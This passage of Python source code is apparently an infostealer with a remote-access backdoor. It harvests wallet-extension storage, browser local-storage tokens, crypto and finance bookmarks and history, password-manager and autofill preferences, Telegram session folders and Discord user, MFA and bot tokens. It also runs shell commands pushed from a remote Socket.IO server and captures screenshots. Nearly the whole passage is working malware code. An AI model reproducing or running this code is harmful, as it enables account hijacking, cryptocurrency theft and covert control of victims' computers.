        except Exception as e:
            logger.debug(f"Error analyzing extension {ext_id}: {e}")
            return None
    
    def _calculate_extension_sensitivity(self, manifest):
        """Calculate sensitivity score for browser extension"""
        score = 0
        
        name = manifest.get("name", "").lower()
        description = manifest.get("description", "").lower()
        permissions = manifest.get("permissions", [])
        
        # High-sensitivity keywords
        sensitive_keywords = {
            "wallet": 10, "crypto": 9, "bitcoin": 8, "ethereum": 8, "metamask": 10,
            "password": 9, "authenticator": 8, "2fa": 7, "vpn": 6, "proxy": 5,
            "ad block": 4, "privacy": 5, "security": 6, "banking": 9
        }
        
        text_content = f"{name} {description}"
        for keyword, keyword_score in sensitive_keywords.items():
            if keyword in text_content:
                score += keyword_score
        
        # Sensitive permissions
        sensitive_permissions = {
            "storage": 3, "unlimitedStorage": 4, "cookies": 5, "tabs": 4,
            "activeTab": 3, "webRequest": 6, "webRequestBlocking": 7,
            "background": 3, "notifications": 2
        }
        
        for permission in permissions:
            if isinstance(permission, str):
                perm_lower = permission.lower()
                for sens_perm, perm_score in sensitive_permissions.items():
                    if sens_perm.lower() in perm_lower:
                        score += perm_score
        
        return score
    
    def _extract_extension_storage_data(self, ext_path, ext_id):
        """Extract storage data from sensitive extensions"""
        storage_data = {}
        
        try:
            # Check for Local Extension Settings
            parent_dir = os.path.dirname(ext_path)
            local_ext_settings_path = os.path.join(parent_dir, "Local Extension Settings", ext_id)
            
            if os.path.exists(local_ext_settings_path):
                # LevelDB storage extraction
                storage_data = self._extract_leveldb_storage(local_ext_settings_path)
        
        except Exception as e:
            logger.debug(f"Error extracting extension storage for {ext_id}: {e}")
        
        return storage_data
    
    def _extract_leveldb_storage(self, leveldb_path):
        """Extract data from LevelDB storage"""
        storage_data = {}
        
        try:
            for file in os.listdir(leveldb_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(leveldb_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            data = f.read().decode('utf-8', errors='ignore')
                            
                        # Look for JSON-like structures
                        json_pattern = r'\{[^{}]*\}'
                        json_matches = re.findall(json_pattern, data)
                        
                        for match in json_matches[:10]:  # Limit to first 10 matches
                            try:
                                parsed_data = json.loads(match)
                                if isinstance(parsed_data, dict) and len(parsed_data) > 0:
                                    storage_data[file] = storage_data.get(file, [])
                                    storage_data[file].append(parsed_data)
                            except:
                                continue
                                
                    except Exception as e:
                        logger.debug(f"Error reading LevelDB file {file}: {e}")
                        continue
        
        except Exception as e:
            logger.debug(f"Error extracting LevelDB storage: {e}")
        
        return storage_data
    
    def _extract_local_storage_comprehensive(self, local_storage_path):
        """Comprehensive local storage extraction with crypto focus"""
        local_storage_data = {}
        
        try:
            for item in os.listdir(local_storage_path):
                if item.endswith('.localstorage'):
                    domain = item.replace('.localstorage', '')
                    
                    # Priority domains for local storage
                    priority_domains = [
                        'metamask', 'phantom', 'solflare', 'binance', 'coinbase', 'crypto.com',
                        'discord.com', 'gmail.com', 'github.com', 'twitter.com'
                    ]
                    
                    # Check if domain is priority or contains sensitive keywords
                    is_priority = any(pd in domain.lower() for pd in priority_domains)
                    has_sensitive_keywords = any(kw in domain.lower() for kw in ['wallet', 'crypto', 'auth', 'token'])
                    
                    if is_priority or has_sensitive_keywords:
                        db_path = os.path.join(local_storage_path, item)
                        domain_storage = self._extract_domain_local_storage(db_path, domain)
                        if domain_storage:
                            local_storage_data[domain] = domain_storage
        
        except Exception as e:
            logger.error(f"❌ Comprehensive local storage extraction failed: {e}")
        
        return local_storage_data
    
    def _extract_domain_local_storage(self, db_path, domain):
        """Extract local storage data for specific domain"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT key, value FROM ItemTable")
            
            storage_items = {}
            sensitive_patterns = ['token', 'auth', 'session', 'key', 'password', 'wallet', 'vault', 'seed']
            
            for row in cursor.fetchall():
                key, value = row[0], row[1]
                
                # Check for sensitive keys
                is_sensitive = any(pattern in key.lower() for pattern in sensitive_patterns)
                
                if is_sensitive or len(storage_items) < 20:  # Include all sensitive + first 20 items
                    # Truncate very long values
                    if isinstance(value, str) and len(value) > 1000:
                        value = value[:1000] + "...[truncated]"
                    
                    storage_items[key] = {
                        "value": value,
                        "is_sensitive": is_sensitive,
                        "extraction_time": datetime.now().isoformat()
                    }
            
            conn.close()
            return storage_items if storage_items else None
            
        except Exception as e:
            logger.debug(f"Error extracting domain storage for {domain}: {e}")
            return None
    
    def _extract_bookmarks_enhanced(self, bookmarks_path):
        """Extract and analyze bookmarks"""
        try:
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            relevant_bookmarks = []
            
            def extract_bookmarks_recursive(node, folder_path=""):
                if isinstance(node, dict):
                    if node.get("type") == "url":
                        url = node.get("url", "")
                        name = node.get("name", "")
                        
                        # Check for sensitive bookmarks
                        if self._is_sensitive_bookmark(url, name):
                            relevant_bookmarks.append({
                                "name": name,
                                "url": url,
                                "folder": folder_path,
                                "date_added": node.get("date_added"),
                                "is_sensitive": True
                            })
                    
                    elif node.get("type") == "folder":
                        folder_name = node.get("name", "")
                        new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
                        
                        for child in node.get("children", []):
                            extract_bookmarks_recursive(child, new_path)
            
            # Process bookmark roots
            roots = bookmarks_data.get("roots", {})
            for root_name, root_data in roots.items():
                extract_bookmarks_recursive(root_data, root_name)
            
            return relevant_bookmarks[:100]  # Limit to 100 bookmarks
            
        except Exception as e:
            logger.debug(f"Error extracting bookmarks: {e}")
            return []
    
    def _is_sensitive_bookmark(self, url, name):
        """Check if bookmark is sensitive/relevant"""
        if not url:
            return False
        
        sensitive_domains = [
            'paypal.com', 'amazon.com', 'github.com', 'discord.com',
            'binance.com', 'coinbase.com', 'crypto.com', 'metamask.io'
        ]
        
        sensitive_keywords = ['wallet', 'crypto', 'trading', 'exchange', 'bank', 'payment']
        
        url_lower = url.lower()
        name_lower = name.lower() if name else ""
        
        return (any(domain in url_lower for domain in sensitive_domains) or
                any(keyword in url_lower or keyword in name_lower for keyword in sensitive_keywords))
    
    def _extract_history_limited(self, history_path):
        """Extract limited browsing history (crypto/financial sites only)"""
        relevant_history = []
        temp_db = None
        
        try:
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(history_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Focus on crypto and financial domains
            sensitive_domains = [
                'binance.com', 'coinbase.com', 'crypto.com', 'metamask.io', 'phantom.app',
                'paypal.com', 'amazon.com', 'github.com', 'discord.com'
            ]
            
            domain_conditions = " OR ".join([f"url LIKE '%{domain}%'" for domain in sensitive_domains])
            
            cursor.execute(f"""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE {domain_conditions}
                ORDER BY last_visit_time DESC
                LIMIT 500
            """)
            
            for row in cursor.fetchall():
                relevant_history.append({
                    "url": row[0],
                    "title": row[1],
                    "visit_count": row[2],
                    "last_visit_time": row[3],
                    "is_sensitive": True
                })
            
            conn.close()
            
        except Exception as e:
            logger.debug(f"Error extracting history: {e}")
        finally:
            if temp_db and os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return relevant_history
    
    def _extract_preferences_enhanced(self, preferences_path):
        """Extract relevant browser preferences"""
        try:
            with open(preferences_path, 'r', encoding='utf-8') as f:
                preferences = json.load(f)
            
            # Extract relevant preference sections
            relevant_prefs = {}
            
            relevant_sections = [
                'profile', 'sync', 'extensions', 'autofill', 'password_manager',
                'signin', 'account_info', 'privacy', 'security'
            ]
            
            for section in relevant_sections:
                if section in preferences:
                    relevant_prefs[section] = preferences[section]
            
            return relevant_prefs
            
        except Exception as e:
            logger.debug(f"Error extracting preferences: {e}")
            return {}
    
    def _calculate_browser_data_size(self, browser_data):
        """Calculate estimated size of browser data"""
        size = 0
        
        for profile_name, profile_data in browser_data.get("profiles", {}).items():
            size += len(profile_data.get("passwords", [])) * 200  # ~200 bytes per password
            size += len(profile_data.get("cookies", [])) * 300    # ~300 bytes per cookie
            size += len(profile_data.get("autofill", [])) * 100   # ~100 bytes per autofill
            size += len(profile_data.get("extensions", [])) * 1024 # ~1KB per extension
            size += len(profile_data.get("bookmarks", [])) * 150  # ~150 bytes per bookmark
            size += len(profile_data.get("history", [])) * 200    # ~200 bytes per history item
        
        return size

class EnhancedMessagingExtractor:
    """📱 Enhanced messaging apps extraction (Telegram, Discord, etc.)"""
    
    def __init__(self, priority_queue):
        self.priority_queue = priority_queue
        self.messaging_data = {}
        self.extraction_stats = {
            "telegram_installations": 0,
            "discord_installations": 0, 
            "tokens_found": 0,
            "sessions_found": 0,
            "total_size": 0
        }
    
    def extract_all_messaging_data(self):
        """Extract all messaging app data with appropriate priorities"""
        logger.info("📱 Starting ENHANCED messaging data extraction...")
        
        extraction_start = time.time()
        
        # Extract Telegram data (MEDIUM priority)
        telegram_data = self._extract_telegram_data_enhanced()
        if telegram_data:
            self.messaging_data["telegram"] = telegram_data
            self.extraction_stats["telegram_installations"] = len(telegram_data)
        
        # Extract Discord data (HIGH priority for tokens, MEDIUM for other data)
        discord_data = self._extract_discord_data_enhanced()
        if discord_data:
            self.messaging_data["discord"] = discord_data
            self.extraction_stats["discord_installations"] = len(discord_data)
        
        extraction_time = time.time() - extraction_start
        
        logger.info(f"✅ MESSAGING EXTRACTION COMPLETE:")
        logger.info(f"   📱 Telegram: {self.extraction_stats['telegram_installations']}")
        logger.info(f"   💬 Discord: {self.extraction_stats['discord_installations']}")
        logger.info(f"   🎯 Tokens: {self.extraction_stats['tokens_found']}")
        logger.info(f"   🔐 Sessions: {self.extraction_stats['sessions_found']}")
        logger.info(f"   ⏱️ Time: {extraction_time:.2f}s")
        
        return self.messaging_data
    
    def _extract_telegram_data_enhanced(self):
        """Enhanced Telegram data extraction"""
        telegram_installations = {}
        
        for path_pattern in CONFIG["TELEGRAM_PATHS"]:
            expanded_path = os.path.expandvars(path_pattern)
            
            if "*" in expanded_path:
                matching_paths = glob.glob(expanded_path)
            else:
                matching_paths = [expanded_path] if os.path.exists(expanded_path) else []
            
            for tdata_path in matching_paths:
                if os.path.exists(tdata_path):
                    logger.info(f"📱 Analyzing Telegram installation: {tdata_path}")
                    telegram_info = self._analyze_telegram_installation(tdata_path)
                    
                    if telegram_info and telegram_info.get("total_size", 0) > 1000:
                        installation_id = f"telegram_{hashlib.md5(tdata_path.encode()).hexdigest()[:8]}"
                        telegram_installations[installation_id] = telegram_info
                        
                        # Add to MEDIUM priority queue
                        self.priority_queue.add_item({
                            "type": "telegram_installation",
                            "installation_id": installation_id,
                            "data": telegram_info,
                            "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["MEDIUM"],
                            "size_estimate": telegram_info.get("total_size", 0),
                            "sessions_count": len(telegram_info.get("sessions", []))
                        }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["MEDIUM"])
                        
                        self.extraction_stats["sessions_found"] += len(telegram_info.get("sessions", []))
                        self.extraction_stats["total_size"] += telegram_info.get("total_size", 0)
        
        return telegram_installations
    
    def _analyze_telegram_installation(self, tdata_path):
        """Comprehensive analysis of Telegram installation"""
        telegram_info = {
            "path": tdata_path,
            "installation_analysis": {
                "total_files": 0,
                "session_files": 0,
                "config_files": 0,
                "cache_files": 0
            },
            "sessions": [],
            "files": [],
            "total_size": 0,
            "backup_created": False,
            "analysis_time": datetime.now().isoformat()
        }
        
        try:
            if not os.path.exists(tdata_path):
                return None
            
            files_analyzed = 0
            
            for item in os.listdir(tdata_path):
                if files_analyzed >= 1000:  # Limit analysis to prevent overload
                    break
                    
                item_path = os.path.join(tdata_path, item)
                
                if os.path.isfile(item_path):
                    try:
                        file_size = os.path.getsize(item_path)
                        file_modified = datetime.fromtimestamp(os.path.getmtime(item_path))
                        
                        file_info = {
                            "name": item,
                            "size": file_size,
                            "modified": file_modified.isoformat(),
                            "analysis": self._analyze_telegram_file(item, file_size)
                        }
                        
                        telegram_info["files"].append(file_info)
                        telegram_info["total_size"] += file_size
                        
                        # Categorize file
                        if file_info["analysis"]["is_session"]:
                            telegram_info["sessions"].append(file_info)
                            telegram_info["installation_analysis"]["session_files"] += 1
                        elif file_info["analysis"]["is_config"]:
                            telegram_info["installation_analysis"]["config_files"] += 1
                        else:
                            telegram_info["installation_analysis"]["cache_files"] += 1
                        
                        files_analyzed += 1
                        
                    except Exception as e:
                        logger.debug(f"Error analyzing Telegram file {item}: {e}")
                        continue
            
            telegram_info["installation_analysis"]["total_files"] = files_analyzed
            
            # Create backup if significant data found
            if telegram_info["total_size"] > 10000:  # > 10KB
                backup_path = self._create_telegram_backup_enhanced(tdata_path)
                if backup_path:
                    telegram_info["backup_path"] = backup_path
                    telegram_info["backup_created"] = True
            
        except Exception as e:
            logger.error(f"❌ Error analyzing Telegram installation: {e}")
            telegram_info["error"] = str(e)
        
        return telegram_info
    
    def _analyze_telegram_file(self, filename, file_size):
        """Analyze individual Telegram file"""
        analysis = {
            "is_session": False,
            "is_config": False,
            "is_cache": False,
            "importance_score": 0,
            "file_type": "unknown"
        }
        
        filename_lower = filename.lower()
        
        # Session file patterns
        if (filename.endswith('s') and len(filename) > 10) or 'key_data' in filename_lower:
            analysis["is_session"] = True
            analysis["file_type"] = "session"
            analysis["importance_score"] = 8
        
        # Config file patterns
        elif filename in ['settings0', 'settings1', 'config'] or 'settings' in filename_lower:
            analysis["is_config"] = True
            analysis["file_type"] = "config"
            analysis["importance_score"] = 6
        
        # Cache and other files
        else:
            analysis["is_cache"] = True
            analysis["file_type"] = "cache"
            analysis["importance_score"] = 2
        
        # Size-based importance adjustment
        if file_size > 50000:  # Files > 50KB might be more important
            analysis["importance_score"] += 2
        elif file_size < 1000:  # Very small files less important
            analysis["importance_score"] -= 1
        
        return analysis
    
    def _create_telegram_backup_enhanced(self, tdata_path):
        """Create enhanced backup of Telegram data"""
        try:
            backup_dir = os.path.join(tempfile.gettempdir(), "messaging_backups")
            os.makedirs(backup_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_filename = f"TELEGRAM_BACKUP_{timestamp}.zip"
            backup_path = os.path.join(backup_dir, backup_filename)
            
            with zipfile.ZipFile(backup_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                files_added = 0
                total_size = 0
                
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        if files_added >= 500:  # Limit number of files
                            break
                            
                        file_path = os.path.join(root, file)
                        
                        try:
                            file_size = os.path.getsize(file_path)
                            
                            # Skip very large cache files (>50MB)
                            if file_size > 50 * 1024 * 1024:
                                continue
                            
                            # Priority to important files
                            analysis = self._analyze_telegram_file(file, file_size)
                            if analysis["importance_score"] >= 4 or total_size < 100 * 1024 * 1024:  # Include important files or until 100MB
                                arcname = os.path.relpath(file_path, tdata_path)
                                zipf.write(file_path, arcname)
                                files_added += 1
                                total_size += file_size
                                
                        except Exception as e:
                            logger.debug(f"Error adding Telegram file {file}: {e}")
                            continue
                    
                    if files_added >= 500:
                        break
            
            logger.info(f"📱 Telegram backup created: {backup_filename} ({files_added} files, {total_size:,} bytes)")
            return backup_path
            
        except Exception as e:
            logger.error(f"❌ Error creating Telegram backup: {e}")
            return None
    
    def _extract_discord_data_enhanced(self):
        """Enhanced Discord data extraction with token focus"""
        discord_installations = {}
        
        for path_pattern in CONFIG["DISCORD_PATHS"]:
            expanded_path = os.path.expandvars(path_pattern)
            
            if "*" in expanded_path:
                matching_paths = glob.glob(expanded_path)
            else:
                matching_paths = [expanded_path] if os.path.exists(expanded_path) else []
            
            for discord_path in matching_paths:
                if os.path.exists(discord_path):
                    logger.info(f"💬 Analyzing Discord installation: {discord_path}")
                    discord_info = self._analyze_discord_installation(discord_path)
                    
                    if discord_info:
                        installation_id = f"discord_{hashlib.md5(discord_path.encode()).hexdigest()[:8]}"
                        discord_installations[installation_id] = discord_info
                        
                        # Tokens get HIGH priority, other data gets MEDIUM
                        priority = CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"] if discord_info.get("tokens") else CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["MEDIUM"]
                        
                        self.priority_queue.add_item({
                            "type": "discord_installation",
                            "installation_id": installation_id,
                            "data": discord_info,
                            "priority": priority,
                            "size_estimate": discord_info.get("total_size", 0),
                            "tokens_count": len(discord_info.get("tokens", [])),
                            "has_tokens": bool(discord_info.get("tokens"))
                        }, priority=priority)
                        
                        self.extraction_stats["tokens_found"] += len(discord_info.get("tokens", []))
        
        # Also extract Discord tokens from browsers
        browser_discord_tokens = self._extract_discord_tokens_from_browsers()
        if browser_discord_tokens:
            discord_installations["browser_tokens"] = {
                "source": "browser_extraction",
                "tokens": browser_discord_tokens,
                "extraction_time": datetime.now().isoformat()
            }
            
            self.priority_queue.add_item({
                "type": "discord_browser_tokens",
                "data": browser_discord_tokens,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"],
                "size_estimate": len(browser_discord_tokens) * 1024,
                "tokens_count": len(browser_discord_tokens)
            }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"])
            
            self.extraction_stats["tokens_found"] += len(browser_discord_tokens)
        
        return discord_installations
    
    def _analyze_discord_installation(self, discord_path):
        """Comprehensive analysis of Discord installation"""
        discord_info = {
            "path": discord_path,
            "tokens": [],
            "local_storage_data": {},
            "settings": {},
            "total_size": 0,
            "analysis_time": datetime.now().isoformat()
        }
        
        try:
            # Extract tokens from Local Storage
            local_storage_path = os.path.join(discord_path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                tokens = self._extract_discord_tokens_enhanced(local_storage_path)
                discord_info["tokens"] = tokens
                logger.info(f"🎯 Found {len(tokens)} Discord tokens in {discord_path}")
            
            # Extract other valuable data
            session_storage_path = os.path.join(discord_path, "Session Storage")
            if os.path.exists(session_storage_path):
                session_data = self._extract_discord_session_data(session_storage_path)
                discord_info["session_data"] = session_data
            
            # Extract settings
            settings_path = os.path.join(discord_path, "settings.json")
            if os.path.exists(settings_path):
                with open(settings_path, 'r', encoding='utf-8') as f:
                    discord_info["settings"] = json.load(f)
                discord_info["total_size"] += os.path.getsize(settings_path)
            
            # Calculate total size estimate
            discord_info["total_size"] += len(discord_info["tokens"]) * 512  # Estimate 512 bytes per token
            
        except Exception as e:
            logger.error(f"❌ Error analyzing Discord installation: {e}")
        
        return discord_info
    
    def _extract_discord_tokens_enhanced(self, leveldb_path):
        """Enhanced Discord token extraction with validation"""
        tokens = []
        
        try:
            # Enhanced token regex patterns
            token_patterns = [
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Standard Discord token
                r'mfa\.[\w-]{84}',                   # MFA token
                r'[\w-]{59,}',                       # Bot tokens (longer),
            ]
            
            for file in os.listdir(leveldb_path):
                if file.endswith('.ldb') or file.endswith('.log') or file.endswith('.sst'):
                    file_path = os.path.join(leveldb_path, file)
                    
                    try:
                        with open(file_path, 'rb') as f:
                            data = f.read().decode('utf-8', errors='ignore')
                        
                        # Search for tokens using all patterns
                        for pattern in token_patterns:
                            found_tokens = re.findall(pattern, data)
                            
                            for token in found_tokens:
                                # Validate token format
                                if self._validate_discord_token(token):
                                    # Check for duplicates
                                    if not any(t["token"] == token for t in tokens):
                                        token_info = {
                                            "token": token,
                                            "source_file": file,
                                            "source_path": leveldb_path,
                                            "found_at": datetime.now().isoformat(),
                                            "token_type": self._identify_discord_token_type(token),
                                            "is_critical": True,
                                            "validation_score": self._score_discord_token(token)
                                        }
                                        tokens.append(token_info)
                    
                    except Exception as e:
                        logger.debug(f"Error reading Discord storage file {file}: {e}")
                        continue
            
            # Sort tokens by validation score
            tokens.sort(key=lambda x: x.get("validation_score", 0), reverse=True)
            
        except Exception as e:
            logger.error(f"❌ Enhanced Discord token extraction failed: {e}")
        
        return tokens
    
    def _validate_discord_token(self, token):
        """Validate Discord token format"""
        if not token or len(token) < 50:
            return False
        
        # Basic format validation
        if token.startswith('mfa.'):
            return len(token) > 80
        elif '.' in token:
            parts = token.split('.')
            return len(parts) >= 3 and all(len(part) > 5 for part in parts)
        else:
            return len(token) > 55  # Bot tokens
        
        return False
    
    def _identify_discord_token_type(self, token):
        """Identify type of Discord token"""
        if token.startswith('mfa.'):
            return "mfa_token"
        elif len(token) > 70:
            return "bot_token"
        else:
            return "user_token"
    
    def _score_discord_token(self, token):
        """Score Discord token based on characteristics"""
        score = 5  # Base score
        
        if token.startswith('mfa.'):
            score += 3  # MFA tokens are valuable
        
        if len(token) > 70:
            score += 2  # Bot tokens
        
        # Check for recent-looking patterns (heuristic)
        if any(c in token for c in 'XYZ'):
            score += 1
        
        return score
    
    def _extract_discord_session_data(self, session_storage_path):
        """Extract Discord session storage data"""
        session_data = {}
        
        try:
            for file in os.listdir(session_storage_path):
                if file.endswith('.localstorage'):
                    file_path = os.path.join(session_storage_path, file)
                    try:
                        conn = sqlite3.connect(file_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT key, value FROM ItemTable")
                        
                        file_data = {}
                        for row in cursor.fetchall():
                            key, value = row
                            if any(keyword in key.lower() for keyword in ['token', 'auth', 'user', 'session']):
                                file_data[key] = value
                        
                        if file_data:
                            session_data[file] = file_data
                        
                        conn.close()
                    except Exception as e:
                        logger.debug(f"Error reading Discord session file {file}: {e}")
        
        except Exception as e:
            logger.debug(f"Error extracting Discord session data: {e}")
        
        return session_data
    
    def _extract_discord_tokens_from_browsers(self):
        """Extract Discord tokens from browser local storage"""
        browser_tokens = []
        
        try:
            for browser_name, paths in CONFIG["BROWSER_PATHS"].items():
                for path_pattern in paths:
                    expanded_path = os.path.expandvars(path_pattern)
                    
                    if "*" in expanded_path:
                        matching_paths = glob.glob(expanded_path)
                    else:
                        matching_paths = [expanded_path] if os.path.exists(expanded_path) else []
                    
                    for browser_path in matching_paths:
                        if os.path.exists(browser_path):
                            tokens = self._scan_browser_for_discord_tokens(browser_path, browser_name)
                            browser_tokens.extend(tokens)
        
        except Exception as e:
            logger.error(f"❌ Error extracting Discord tokens from browsers: {e}")
        
        return browser_tokens
    
    def _scan_browser_for_discord_tokens(self, browser_path, browser_name):
        """Scan specific browser for Discord tokens"""
        tokens = []
        
        try:
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
            
            for profile in profiles:
                local_storage_path = os.path.join(browser_path, profile, "Local Storage")
                if not os.path.exists(local_storage_path):
                    continue
                
                for item in os.listdir(local_storage_path):
                    if "discord" in item.lower() and item.endswith('.localstorage'):
                        db_path = os.path.join(local_storage_path, item)
                        
                        try:
                            conn = sqlite3.connect(db_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT key, value FROM ItemTable")
                            
                            for row in cursor.fetchall():
                                key, value = row
                                if "token" in key.lower() and value:
                                    # Validate token in browser storage
                                    if self._validate_discord_token(str(value).strip('"')):
                                        tokens.append({
                                            "token": str(value).strip('"'),
                                            "source": f"{browser_name}_{profile}",
                                            "storage_key": key,
                                            "found_at": datetime.now().isoformat(),
                                            "is_critical": True
                                        })
                            
                            conn.close()
                            
                        except Exception as e:
                            logger.debug(f"Error scanning {browser_name} Discord storage: {e}")
        
        except Exception as e:
            logger.debug(f"Error scanning {browser_name} for Discord tokens: {e}")
        
        return tokens

class AdvancedRemoteControlManager:
    """🎮 Advanced remote control system with enhanced security and capabilities"""
    
    def __init__(self, socketio_client=None):
        self.socketio_client = socketio_client
        self.command_history = []
        self.active_sessions = {}
        self.control_stats = {
            "commands_executed": 0,
            "commands_failed": 0,
            "session_start": datetime.now(),
            "last_activity": datetime.now()
        }
        self.screenshot_thread = None
        self.is_active = False
        
    def initialize_remote_control(self):
        """Initialize enhanced remote control capabilities"""
        if not CONFIG["REMOTE_CONTROL"]["enabled"]:
            logger.info("⚠️ Remote control disabled in configuration")
            return False
        
        try:
            self.is_active = True
            
            # Start automatic screenshot capture if enabled
            if CONFIG["REMOTE_CONTROL"]["auto_screenshot"]:
                self._start_auto_screenshot()
            
            # Register command handlers
            if self.socketio_client:
                self._register_socketio_handlers()
            
            logger.info("🎮 Advanced remote control initialized successfully")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to initialize remote control: {e}")
            return False
    
    def _register_socketio_handlers(self):
        """Register Socket.IO event handlers for remote control"""
        
        @self.socketio_client.on('remote_command')
        def handle_remote_command(data):
            """Handle incoming remote commands"""
            try:
                command = data.get('command', '').strip()
                command_id = data.get('command_id', str(uuid.uuid4())[:8])
                
                logger.info(f"🎮 Received remote command (ID: {command_id}): {command[:50]}...")
                
                # Execute command with enhanced security
                result = self.execute_command_secure(command, command_id)
                
                # Send result back
                self.socketio_client.emit('command_result', {
                    'command_id': command_id,
                    'result': result,
                    'timestamp': datetime.now().isoformat(),
                    'client_id': CONFIG['CLIENT_ID']
                })
                
            except Exception as e:
                logger.error(f"❌ Error handling remote command: {e}")
        
        @self.socketio_client.on('request_screenshot')
        def handle_screenshot_request(data):
            """Handle screenshot requests"""
            try:
                screenshot_data = self.capture_screenshot_enhanced()
                if screenshot_data:
                    self.socketio_client.emit('screenshot_result', {
                        'screenshot': screenshot_data,
                        'timestamp': datetime.now().isoformat(),
                        'client_id': CONFIG['CLIENT_ID']
                    })
            except Exception as e:
                logger.error(f"❌ Error handling screenshot request: {e}")
        
        @self.socketio_client.on('request_system_info')
        def handle_system_info_request(data):
            """Handle system information requests"""
            try:
                system_info = self.get_enhanced_system_info()
                self.socketio_client.emit('system_info_result', {
                    'system_info': system_info,
                    'timestamp': datetime.now().isoformat(),
                    'client_id': CONFIG['CLIENT_ID']
                })
            except Exception as e:
                logger.error(f"❌ Error handling system info request: {e}")
    
    def execute_command_secure(self, command, command_id):
        """Execute command with enhanced security checks"""
        result = {
            "command_id": command_id,
            "command": command,
            "status": "unknown",
            "output": "",
            "error": "",
            "execution_time": 0,
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            # Security validation
            if not self._validate_command_security(command):
                result["status"] = "blocked"
                result["error"] = "Command blocked by security policy"
                logger.warning(f"🚫 Blocked potentially dangerous command: {command}")
                return result
            
            # Command length check
            if len(command) > CONFIG["REMOTE_CONTROL"]["max_command_length"]:
                result["status"] = "error"
                result["error"] = "Command too long"
                return result
            
            # Execute command
            start_time = time.time()
            
            if command.lower().startswith('cd '):
                # Handle directory changes
                result = self._handle_cd_command(command, result)
            else:
                # Execute regular command
                result = self._execute_system_command(command, result)
            
            result["execution_time"] = time.time() - start_time
            
            # Update statistics
            if result["status"] == "success":
                self.control_stats["commands_executed"] += 1
            else:
                self.control_stats["commands_failed"] += 1
            
            self.control_stats["last_activity"] = datetime.now()
            
            # Add to command history
            self._add_to_command_history(result)
            
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            logger.error(f"❌ Command execution failed: {e}")
        
        return result
    
    def _validate_command_security(self, command):
        """Enhanced security validation for commands"""
        command_lower = command.lower().strip()
        
        # Blocked commands
        dangerous_commands = [
            'format', 'del', 'rmdir', 'rd ', 'shutdown', 'restart', 'reboot',
            'taskkill', 'wmic', 'powershell', 'cmd /c', 'reg delete', 'sc delete'
        ]
        
        # Check for dangerous commands
        for dangerous_cmd in dangerous_commands:
            if command_lower.startswith(dangerous_cmd):
                return False
        
        # Check restricted commands
        restricted = CONFIG["REMOTE_CONTROL"]["restricted_commands"]
        for restricted_cmd in restricted:
            if command_lower.startswith(restricted_cmd.lower()):
                return False
        
        # Check for potentially dangerous patterns
        dangerous_patterns = [
            r'>\s*nul', r'\|\s*del', r'&\s*rd', r'&&\s*format',
            r';\s*shutdown', r'\|\s*powershell'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, command_lower):
                return False
        
        return True
    
    def _execute_system_command(self, command, result):
        """Execute system command with enhanced output capture"""
        try:
            # Execute command with timeout
            timeout = CONFIG["REMOTE_CONTROL"]["command_timeout"]
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=os.getcwd()
            )
            
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                
                result["status"] = "success" if process.returncode == 0 else "error"
                result["return_code"] = process.returncode
                result["output"] = stdout[:5000] if stdout else ""  # Limit output size
                result["error"] = stderr[:1000] if stderr else ""   # Limit error size
                
                if len(stdout) > 5000:
                    result["output"] += "\n...[output truncated]"
                
            except subprocess.TimeoutExpired:
                process.kill()
                result["status"] = "timeout"
                result["error"] = f"Command timed out after {timeout} seconds"
        
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
        
        return result
    
    def _handle_cd_command(self, command, result):
        """Handle directory change commands"""
        try:
            # Extract target directory
            target_dir = command[3:].strip()
            
            if not target_dir:
                target_dir = os.path.expanduser("~")
            
            # Validate directory exists
            if os.path.exists(target_dir) and os.path.isdir(target_dir):
                os.chdir(target_dir)
                result["status"] = "success"
                result["output"] = f"Changed directory to: {os.getcwd()}"
            else:
                result["status"] = "error"
                result["error"] = f"Directory not found: {target_dir}"
        
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
        
        return result
    
    def _add_to_command_history(self, result):
        """Add command result to history"""
        self.command_history.append(result)
        
        # Maintain history size limit
        max_history = CONFIG["REMOTE_CONTROL"]["command_history_size"]
        if len(self.command_history) > max_history:
            self.command_history = self.command_history[-max_history:]
    
    def capture_screenshot_enhanced(self):
        """Capture enhanced screenshot with metadata"""
        try:
            import io
            from PIL import ImageGrab, Image
            
            # Capture screenshot
            screenshot = ImageGrab.grab()
            
            # Resize if too large (to reduce upload size)
            max_size = (1920, 1080)
            if screenshot.size[0] > max_size[0] or screenshot.size[1] > max_size[1]:
                screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            # Convert to base64
